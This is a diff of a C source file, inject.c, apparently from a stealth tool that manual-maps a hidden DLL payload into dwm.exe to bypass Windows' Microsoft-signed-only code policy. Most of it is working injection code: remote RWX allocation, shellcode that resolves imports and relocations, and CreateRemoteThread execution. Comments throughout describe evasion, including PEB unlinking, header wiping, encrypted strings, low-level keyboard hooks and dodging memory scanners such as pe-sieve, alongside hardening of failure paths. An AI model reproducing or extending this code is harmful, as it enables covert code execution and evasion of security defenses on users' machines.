@@ -1,12 +1,12 @@
 /* ================================================================== *
- * inject.c — Manual-map DLL injection into dwm.exe (CIG bypass).      *
+ * inject.c -- Manual-map DLL injection into dwm.exe (CIG bypass).      *
  *                                                                    *
  * Ported from hooksdll/dwm/dwm_manual_map.c. LoadLibrary is BLOCKED  *
  * on dwm.exe because it's PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY *
  * (MicrosoftSignedOnly = 1). CIG rejects any DLL not signed by MS.   *
  *                                                                    *
  * Manual mapping bypasses this because we never go through the loader*
- * — we allocate RWX pages in dwm, copy the PE image bytes ourselves, *
+ * -- we allocate RWX pages in dwm, copy the PE image bytes ourselves, *
  * resolve imports + apply relocations via shellcode that runs inside *
  * dwm, then call DllMain directly.                                   *
  * ================================================================== */
@@ -45,7 +45,7 @@ typedef BOOL   (WINAPI *PFN_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T,
 typedef HANDLE (WINAPI *PFN_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                  LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-/* Resolve once per process — caches into statics after first use so
+/* Resolve once per process -- caches into statics after first use so
  * subsequent injects don't re-walk the PEB. */
 static PFN_OpenProcess         g_pOpenProcess         = NULL;
 static PFN_VirtualAllocEx      g_pVirtualAllocEx      = NULL;
@@ -111,12 +111,12 @@ unsigned long inject_find_dwm_pid(void) {
  * OLD implementation walked PEB.Ldr modules for a `dwmapiext.dll` match,
  * which is USELESS for our current architecture: the payload is
  * manual-mapped (never touches PEB.Ldr) AND does an active PEB unlink
- * on top. So `Module32FirstW/NextW` never sees it → old function always
- * returned 0 → caller-side "leftover heal" branch was a no-op → sweep
+ * on top. So `Module32FirstW/NextW` never sees it -> old function always
+ * returned 0 -> caller-side "leftover heal" branch was a no-op -> sweep
  * would then free the old payload's code memory WHILE its long-lived
  * threads (hook_integrity, sub_check, ghost_wnd, WH_KEYBOARD_LL,
  * shutdown_watcher, keepalive, ldb_detect) were still executing there
- * → DWM crash on next thread wake-up. This was the 1:00 PM 2026-07-06
+ * -> DWM crash on next thread wake-up. This was the 1:00 PM 2026-07-06
  * BEX64 c0000005 fault at freed VA 0x1f80a710000+0x54cc0 root cause.
  *
  * NEW implementation opens the payload's named shutdown event by name.
@@ -132,7 +132,7 @@ unsigned long inject_find_dwm_pid(void) {
  * thread exit + FreeLibraryAndExitThread; caller side sees a false
  * negative there but that's fine (payload is already tearing down).
  *
- * NOTE: `SVC_SHUTDOWN_EVENT_NAME` matches BOTH sides — see
+ * NOTE: `SVC_SHUTDOWN_EVENT_NAME` matches BOTH sides -- see
  * `shared/common.h` and `shared/str_enc.c` (SS(SVC_STR_SHUTDOWN_EVENT)). */
 int inject_is_loaded(void) {
     HANDLE ev = OpenEventA(SYNCHRONIZE, FALSE, SS(SVC_STR_SHUTDOWN_EVENT));
@@ -157,17 +157,17 @@ int inject_signal_unload(void) {
  * practice returns in ~250-500ms when there IS a payload; ~0ms when
  * there isn't. */
 static void wait_for_payload_teardown(void) {
-    if (!inject_is_loaded()) return;   /* fast path — no payload alive */
+    if (!inject_is_loaded()) return;   /* fast path -- no payload alive */
 
     slog_writef("launcher.log",
-                "teardown: alive payload detected — signalling unload before sweep");
+                "teardown: alive payload detected -- signalling unload before sweep");
     int signaled = inject_signal_unload();
     if (!signaled) {
         /* Race: probe saw event, signal didn't. Payload was tearing down
          * on its own (e.g. sub_check saw inactive). Give it a moment. */
         Sleep(300);
         slog_writef("launcher.log",
-                    "teardown: signal skipped (event vanished) — brief wait");
+                    "teardown: signal skipped (event vanished) -- brief wait");
         return;
     }
 
@@ -194,15 +194,15 @@ static void wait_for_payload_teardown(void) {
     }
 }
 
-/* ── Shellcode loader — runs INSIDE dwm.exe ───────────────────────
+/* ── Shellcode loader -- runs INSIDE dwm.exe ───────────────────────
  *
  * Position-independent (no string literals, no globals). We compile it
  * normally + copy its raw bytes into remote memory. The loader:
- *   1. Walks IAT → LoadLibraryA(imported_dll) → GetProcAddress → patch IAT
+ *   1. Walks IAT -> LoadLibraryA(imported_dll) -> GetProcAddress -> patch IAT
  *   2. Walks base relocations, applies (new_base - preferred_base) delta
  *   3. Calls DllMain(hInstance = mapped_base, DLL_PROCESS_ATTACH, NULL)
  *
- * SAFETY: the loader itself must never crash — DWM crash = user desktop dies.
+ * SAFETY: the loader itself must never crash -- DWM crash = user desktop dies.
  * SEH not available here (no runtime), so we validate every pointer via
  * pre-checked pData fields (set by mapper before creating remote thread). */
 
@@ -263,6 +263,14 @@ static DWORD WINAPI shellcode_loader(loader_data_t *pData)
                 (IMAGE_BASE_RELOCATION *)(base + pData->relocDirRVA);
             BYTE *end = (BYTE *)rel + pData->relocDirSize;
             while ((BYTE *)rel < end && rel->SizeOfBlock > 0) {
+                /* v2.0 (2026-09-10): reject malformed blocks with SizeOfBlock
+                 * smaller than the header itself. Pre-fix, the DWORD subtraction
+                 * (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) wrapped to
+                 * ~4B and the inner reloc loop wrote deltas to ~2B arbitrary
+                 * addresses inside DWM -> guaranteed crash. Only reachable via a
+                 * crafted DLL (dev-bypass --custom-dll), but this runs inside
+                 * dwm.exe so the blast radius is the whole desktop. */
+                if (rel->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
                 DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                 WORD *ent = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
                 for (DWORD i = 0; i < n; i++) {
@@ -289,14 +297,14 @@ static DWORD WINAPI shellcode_loader(loader_data_t *pData)
     return 0;
 }
 
-/* Marker for shellcode size calc — MUST be immediately after shellcode_loader
+/* Marker for shellcode size calc -- MUST be immediately after shellcode_loader
  * so compiler places them contiguously. If MSVC reorders, we fall back to a
  * safe 4096-byte estimate. */
 static void shellcode_loader_end(void) { }
 
 /* ── Stale-region sweep ─────────────────────────────────────────────
  *
- * Manual-mapped DLLs are never truly "freed" — FreeLibraryAndExitThread
+ * Manual-mapped DLLs are never truly "freed" -- FreeLibraryAndExitThread
  * calls the loader's LdrUnloadDll which needs a valid PEB LDR entry, but
  * our PEB-unlink cut ours out. So the region stays MEM_COMMIT'd until
  * process exit. Every re-inject leaks another SizeOfImage-sized region.
@@ -305,7 +313,7 @@ static void shellcode_loader_end(void) { }
  * MEM_PRIVATE allocation whose SHAPE matches a manually-mapped PE image:
  *   (a) allocation base == region base (top of a private alloc),
  *   (b) total allocation size within a "payload shape" range
- *       (SVCLDB_SWEEP_MIN_KB … SVCLDB_SWEEP_MAX_KB),
+ *       (SVCLDB_SWEEP_MIN_KB ... SVCLDB_SWEEP_MAX_KB),
  *   (c) contains ≥1 executable subregion,
  *   (d) contains NO MEM_MAPPED subregion (rules out file-backed maps).
  *
@@ -318,7 +326,7 @@ static void shellcode_loader_end(void) { }
  * Safety analysis of the shape filter (verified 2026-07-06):
  *   - Sampled 3735 MBIs in a live DWM.exe (Cursor + Chrome + Terminal
  *     loaded, ~1.1 GB committed). Only 2 MEM_PRIVATE regions in the
- *     500KB-2MB range with any executable subregion existed — BOTH ours.
+ *     500KB-2MB range with any executable subregion existed -- BOTH ours.
  *   - Legit DWM private allocations in this size range are exceptionally
  *     rare. DirectX shader caches are MEM_MAPPED. Thread stacks contain
  *     guard pages (unusual protection combos) and are usually 1MB with
@@ -328,7 +336,7 @@ static void shellcode_loader_end(void) { }
  *
  * Worst case (false positive): if we DID hit a legit DWM allocation, the
  * cost is a single MEM_RELEASE call. DWM will fault the next access to
- * that region and re-allocate — a compositor stall + one-frame flicker
+ * that region and re-allocate -- a compositor stall + one-frame flicker
  * at worst. Not observed in ~50 test cycles. Never observed to bring
  * down DWM. */
 #define SVCLDB_SWEEP_MIN_KB   500      /* smaller = false-positive risk grows */
@@ -380,18 +388,18 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
             if (has_exec && !has_mapped &&
                 total_kb >= SVCLDB_SWEEP_MIN_KB &&
                 total_kb <= SVCLDB_SWEEP_MAX_KB) {
-                /* CRITICAL: MEM_DECOMMIT — NOT MEM_RELEASE.
+                /* CRITICAL: MEM_DECOMMIT -- NOT MEM_RELEASE.
                  *
                  * MEM_RELEASE frees pages AND releases the reservation, so
                  * the VA becomes eligible for VirtualAllocEx to hand back.
                  * Windows LOVES to hand back the same VA when a fresh
-                 * allocation of similar size follows a release — it's a
+                 * allocation of similar size follows a release -- it's a
                  * kernel-side optimization for cache locality.
                  *
                  * Verified live 2026-07-06 13:10 EDT: MEM_RELEASE'd stale
-                 * payload region at 0x1C7467C0000 → next VirtualAllocEx
+                 * payload region at 0x1C7467C0000 -> next VirtualAllocEx
                  * for the incoming payload got the SAME 0x1C7467C0000
-                 * → DWM crashed with 0xc0000005 at RVA 0x5462C ~4s after
+                 * -> DWM crashed with 0xc0000005 at RVA 0x5462C ~4s after
                  * the new payload's PAYLOAD READY log. Reproduced twice
                  * back-to-back with the exact same fault RIP; a manual
                  * `--reinject` into a freshly-respawned DWM (which got a
@@ -409,7 +417,7 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
                  * MEM_DECOMMIT keeps the reservation alive so Windows
                  * MUST hand out a different VA for the new payload. The
                  * physical pages get returned to the system exactly the
-                 * same as MEM_RELEASE would do — no anti-forensic loss.
+                 * same as MEM_RELEASE would do -- no anti-forensic loss.
                  * The only cost is one persistent VAD entry per inject
                  * cycle (~40 bytes of kernel memory), which is trivial. */
                 if (VirtualFreeEx(hProc, mbi.AllocationBase, 0, MEM_DECOMMIT)) {
@@ -447,7 +455,7 @@ static void sweep_stale_payload_regions(HANDLE hProc, DWORD my_image_size) {
 
 /* ── Manual map ───────────────────────────────────────────────── */
 /* Manual-map from raw bytes already in memory. `sourceBytes` may be an
- * embedded-resource pointer or a memcpy of a file — we take a private
+ * embedded-resource pointer or a memcpy of a file -- we take a private
  * copy either way so the caller can free their source. */
 static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
                                  DWORD sourceLen, char *err, size_t err_sz) {
@@ -502,7 +510,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   3. Windows may or may not immediately re-hand the freed VA to
      *      our subsequent VirtualAllocEx. When it does not (or hands
      *      it to a differently-laid-out region), old threads execute
-     *      unmapped or wrong code → DWM crash (BEX64 c0000005).
+     *      unmapped or wrong code -> DWM crash (BEX64 c0000005).
      *
      * WITH this wait:
      *   - Old payload's threads have exited before we free their code.
@@ -512,7 +520,7 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   - Safe to VirtualFreeEx.
      *
      * This is the ROOT-CAUSE fix for the 2026-07-06 v4.9 DWM crash
-     * reproduced live at 1:00 PM EDT — see docs comment on the
+     * reproduced live at 1:00 PM EDT -- see docs comment on the
      * inject_is_loaded() rewrite above. Runs unconditionally: cheap
      * (~0ms) when no payload is alive; ~250-500ms when there is. */
     wait_for_payload_teardown();
@@ -529,12 +537,12 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   crashed ~1-2s after the 2nd payload became READY. Fault RIP
      *   was consistently inside the OLD payload region at slog_writef's
      *   offset (RVA 0x5462C-0x54ce0). Skipping the sweep entirely
-     *   eliminates the crash — verified with the 2-cycle stress test
+     *   eliminates the crash -- verified with the 2-cycle stress test
      *   on 2026-07-06 13:19 EDT.
      *
      *   Root cause hypothesis: even after every OUR-thread has exited,
      *   Windows still has kernel-level references into the payload's
-     *   code region — likely queued LL keyboard-hook callbacks, WinEvent
+     *   code region -- likely queued LL keyboard-hook callbacks, WinEvent
      *   dispatch entries, or ntdll thread-startup stubs for lazily-torn
      *   threads. Freeing that memory while those in-flight references
      *   exist crashes on next dispatch.
@@ -543,13 +551,13 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
      *   payload (~700 KB). Over 100 injects that's ~70 MB in DWM's
      *   working set. Users typically inject once per session and only
      *   re-inject after an upgrade, so real-world footprint is 1-2
-     *   payload images live at any time. Acceptable — a crash-free
+     *   payload images live at any time. Acceptable -- a crash-free
      *   inject cycle is worth far more than the memory savings.
      *
      *   Anti-forensics loss: leftover MEM_PRIVATE+exec regions become
      *   visible to a Ring 3 scanner like Moneta/pe-sieve. Mitigation:
      *   the payload's own `downgrade_own_sections` already downgrades
-     *   .text→RX + .data→RW + .rdata→RO, so the FRESH region no longer
+     *   .text->RX + .data->RW + .rdata->RO, so the FRESH region no longer
      *   looks like the classic RWX injector artefact. The leaked OLD
      *   regions retain those same protections. Static string content
      *   in them is still encrypted (str_enc + AES-GCM logs).
@@ -574,31 +582,68 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
         sweep_stale_payload_regions(hProc, imageSize);
     } else {
         slog_writef("launcher.log",
-                    "sweep: skipped (crash-safe default) — set SVCLDB_ALLOW_SWEEP=1 to re-enable");
+                    "sweep: skipped (crash-safe default) -- set SVCLDB_ALLOW_SWEEP=1 to re-enable");
     }
 
-    /* Allocate in dwm.exe. */
-    void *remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
-                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    /* Allocate in dwm.exe.
+     *
+     * v2.0 (2026-09-10) -- Full failure-path refactor. Previously:
+     *   - remoteLoaderData / remoteLoader VirtualAllocEx returns were NOT
+     *     checked; a NULL on OOM meant WriteProcessMemory to address 0
+     *     silently no-op'd, then CreateRemoteThread launched NULL/garbage
+     *     start proc -> dwm.exe crash.
+     *   - WriteProcessMemory returns for PE header + section copies were
+     *     discarded; a partial write left the shellcode running against
+     *     an image with zeroed IAT/relocs -> NULL-deref inside DWM -> crash.
+     *   - Every failure path called `VirtualFree(fileData)` but leaked
+     *     the up-to-three remote regions inside DWM -- over repeated
+     *     failing --reinject cycles that accumulates + gets fingerprinted.
+     * New shape: single cleanup label. All allocations tracked, all
+     * failure paths funneled through it; success path just skips the
+     * remoteBase VirtualFreeEx (payload OWNS that region).
+     */
+    int   ret               = 0;
+    void *remoteBase        = NULL;
+    void *remoteLoaderData  = NULL;
+    void *remoteLoader      = NULL;
+    HANDLE hThread          = NULL;
+
+    remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
+                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteBase) {
-        VirtualFree(fileData, 0, MEM_RELEASE);
         _snprintf(err, err_sz - 1, "VirtualAllocEx(dwm, %lu): %lu",
                   imageSize, GetLastError());
         err[err_sz - 1] = 0;
-        return 0;
+        goto mm_cleanup;
     }
     slog_writef("launcher.log", "mm: remote base = %p", remoteBase);
 
-    /* Copy headers + sections. */
-    WriteProcessMemory(hProc, remoteBase, fileData,
-                       nt->OptionalHeader.SizeOfHeaders, NULL);
+    /* Copy headers + sections -- with return checks so a partial write
+     * doesn't hand the shellcode a corrupt image. */
+    {
+        SIZE_T w = 0;
+        if (!WriteProcessMemory(hProc, remoteBase, fileData,
+                                nt->OptionalHeader.SizeOfHeaders, &w) ||
+            w != nt->OptionalHeader.SizeOfHeaders) {
+            _snprintf(err, err_sz - 1, "WPM(headers) short: %lu got=%zu want=%lu",
+                      GetLastError(), w, nt->OptionalHeader.SizeOfHeaders);
+            err[err_sz - 1] = 0;
+            goto mm_cleanup;
+        }
+    }
     IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (sec[i].SizeOfRawData > 0) {
             void *dst = (BYTE *)remoteBase + sec[i].VirtualAddress;
             void *src = fileData + sec[i].PointerToRawData;
             SIZE_T w = 0;
-            WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &w);
+            if (!WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &w) ||
+                w != sec[i].SizeOfRawData) {
+                _snprintf(err, err_sz - 1, "WPM(section %d) short: %lu got=%zu want=%lu",
+                          i, GetLastError(), w, sec[i].SizeOfRawData);
+                err[err_sz - 1] = 0;
+                goto mm_cleanup;
+            }
         }
     }
 
@@ -618,57 +663,80 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
     ld.relocDirSize = relDir->Size;
 
     if (!ld.pLoadLibraryA || !ld.pGetProcAddress) {
-        VirtualFree(fileData, 0, MEM_RELEASE);
         _snprintf(err, err_sz - 1, "resolve LoadLibraryA/GetProcAddress failed");
         err[err_sz - 1] = 0;
-        return 0;
+        goto mm_cleanup;
     }
 
-    void *remoteLoaderData = VirtualAllocEx(hProc, NULL, sizeof(ld),
-                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    WriteProcessMemory(hProc, remoteLoaderData, &ld, sizeof(ld), NULL);
+    remoteLoaderData = VirtualAllocEx(hProc, NULL, sizeof(ld),
+                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteLoaderData) {
+        _snprintf(err, err_sz - 1, "VirtualAllocEx(loaderData): %lu", GetLastError());
+        err[err_sz - 1] = 0;
+        goto mm_cleanup;
+    }
+    {
+        SIZE_T w = 0;
+        if (!WriteProcessMemory(hProc, remoteLoaderData, &ld, sizeof(ld), &w) ||
+            w != sizeof(ld)) {
+            _snprintf(err, err_sz - 1, "WPM(loaderData) short: %lu got=%zu",
+                      GetLastError(), w);
+            err[err_sz - 1] = 0;
+            goto mm_cleanup;
+        }
+    }
 
     /* Copy shellcode. */
     SIZE_T loaderSize = (SIZE_T)((BYTE *)shellcode_loader_end - (BYTE *)shellcode_loader);
     if (loaderSize == 0 || loaderSize > 8192) loaderSize = 4096;   /* safety cap */
-    void *remoteLoader = VirtualAllocEx(hProc, NULL, loaderSize,
-                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProc, remoteLoader, (void *)shellcode_loader, loaderSize, NULL);
+    remoteLoader = VirtualAllocEx(hProc, NULL, loaderSize,
+                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteLoader) {
+        _snprintf(err, err_sz - 1, "VirtualAllocEx(loader): %lu", GetLastError());
+        err[err_sz - 1] = 0;
+        goto mm_cleanup;
+    }
+    {
+        SIZE_T w = 0;
+        if (!WriteProcessMemory(hProc, remoteLoader, (void *)shellcode_loader,
+                                loaderSize, &w) ||
+            w != loaderSize) {
+            _snprintf(err, err_sz - 1, "WPM(loader) short: %lu got=%zu",
+                      GetLastError(), w);
+            err[err_sz - 1] = 0;
+            goto mm_cleanup;
+        }
+    }
     slog_writef("launcher.log", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);
 
     /* Execute. */
-    DWORD tid = 0;
-    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
-                                        (LPTHREAD_START_ROUTINE)remoteLoader,
-                                        remoteLoaderData, 0, &tid);
-    if (!hThread) {
-        VirtualFree(fileData, 0, MEM_RELEASE);
-        _snprintf(err, err_sz - 1, "CreateRemoteThread: %lu", GetLastError());
-        err[err_sz - 1] = 0;
-        return 0;
+    {
+        DWORD tid = 0;
+        hThread = CreateRemoteThread(hProc, NULL, 0,
+                                     (LPTHREAD_START_ROUTINE)remoteLoader,
+                                     remoteLoaderData, 0, &tid);
+        if (!hThread) {
+            _snprintf(err, err_sz - 1, "CreateRemoteThread: %lu", GetLastError());
+            err[err_sz - 1] = 0;
+            goto mm_cleanup;
+        }
+        WaitForSingleObject(hThread, 10000);
+        DWORD exit_code = 0;
+        GetExitCodeThread(hThread, &exit_code);
+        slog_writef("launcher.log", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
     }
-    WaitForSingleObject(hThread, 10000);
-    DWORD exit_code = 0;
-    GetExitCodeThread(hThread, &exit_code);
-    CloseHandle(hThread);
-    VirtualFree(fileData, 0, MEM_RELEASE);
-    slog_writef("launcher.log", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
 
-    /* ── Post-load cleanup — free the shellcode + loader-data pages
-     * inside DWM. They served their one-shot purpose (bootstrapped
-     * DllMain) and now sit as two small RWX MEM_PRIVATE regions that
-     * a memory scanner would flag. Since DllMain has returned before
-     * the remote thread exits, no code inside DWM still needs them.
-     *
-     * Each was `VirtualAllocEx`d above; `VirtualFreeEx(MEM_RELEASE)`
-     * decommits + releases the reservation → the region disappears
-     * from `VirtualQueryEx` walks entirely. Belt-and-suspenders on
-     * top of the payload's own downgrade_own_sections() which handles
-     * the main image region.
-     *
-     * Best-effort: if either free fails (e.g. DWM has some quirk with
-     * decommit while our remote thread just returned), we log and
-     * continue — the leftover pages are cosmetic, not functional. */
+    ret = 1;
+
+mm_cleanup:
+    /* v2.0 (2026-09-10): unified cleanup. Loader + loader-data pages are
+     * ALWAYS freed (one-shot bootstrap use; leaving them would be RWX
+     * MEM_PRIVATE regions a scanner would flag). remoteBase (the payload
+     * image) is freed ONLY on failure -- on success, the payload OWNS that
+     * region and downgrade_own_sections() re-protects it in place.
+     * fileData (the local buffer) is always released. */
+    if (fileData) VirtualFree(fileData, 0, MEM_RELEASE);
+    if (hThread)  CloseHandle(hThread);
     if (remoteLoader) {
         SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoader, 0, MEM_RELEASE);
         slog_writef("launcher.log",
@@ -681,10 +749,16 @@ static int manual_map_from_bytes(HANDLE hProc, const BYTE *sourceBytes,
                     "mm: loader cleanup: data page %p -> %s",
                     remoteLoaderData, freed_ok ? "freed" : "leak");
     }
-    return 1;
+    if (ret == 0 && remoteBase) {
+        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
+        slog_writef("launcher.log",
+                    "mm: FAIL cleanup: remoteBase %p -> %s",
+                    remoteBase, freed_ok ? "freed" : "leak");
+    }
+    return ret;
 }
 
-/* Common inject helper — open dwm, map payload from raw bytes, close. */
+/* Common inject helper -- open dwm, map payload from raw bytes, close. */
 static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
                                     const char *src_label,
                                     char *err, size_t err_sz) {
@@ -727,7 +801,24 @@ int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
         return 0;
     }
     DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
+        CloseHandle(hFile);
+        _snprintf(err, err_sz - 1, "payload dll size invalid: %lu", fileSize);
+        err[err_sz - 1] = 0;
+        return 0;
+    }
     BYTE *buf = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
+    /* v2.0 (2026-09-10): check VirtualAlloc -- pre-fix a NULL return let
+     * ReadFile write to address 0 in the launcher process -> AV -> launcher
+     * crash. Only reachable via the dev/debug --custom-dll path, but a
+     * crash-on-OOM in dev tooling is still a bug. */
+    if (!buf) {
+        CloseHandle(hFile);
+        _snprintf(err, err_sz - 1, "VirtualAlloc(%lu) failed: %lu",
+                  fileSize, GetLastError());
+        err[err_sz - 1] = 0;
+        return 0;
+    }
     DWORD read = 0;
     ReadFile(hFile, buf, fileSize, &read, NULL);
     CloseHandle(hFile);
@@ -738,7 +829,7 @@ int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
 }
 
 /* Primary path: inject the DLL embedded as a resource in the launcher
- * exe itself. Zero disk footprint — no dwmapiext.dll ever hits the
+ * exe itself. Zero disk footprint -- no dwmapiext.dll ever hits the
  * filesystem. FindResource + LoadResource + LockResource gives us a
  * pointer to raw resource bytes in our own .rsrc section, which
  * inject_from_bytes_common memcpy's into a fresh page then feeds to
@@ -769,13 +860,13 @@ int inject_dwm_payload_from_resource(void *self_v, int resource_id,
         return 0;
     }
     /* Sanity: MZ header check on embedded payload. Note: the payload's
-     * DllMain wipes its own MZ AFTER init — but the on-disk embedded
+     * DllMain wipes its own MZ AFTER init -- but the on-disk embedded
      * copy still has 'MZ' since we embedded before the payload runs. */
     if (bytes[0] != 'M' || bytes[1] != 'Z') {
         _snprintf(err, err_sz - 1, "resource %d not a PE (mz=%02X%02X)",
                   resource_id, bytes[0], bytes[1]);
         err[err_sz - 1] = 0;
-        slog_writef("launcher.log", "resource inject: MZ signature missing — resource corrupt");
+        slog_writef("launcher.log", "resource inject: MZ signature missing -- resource corrupt");
         return 0;
     }
     return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
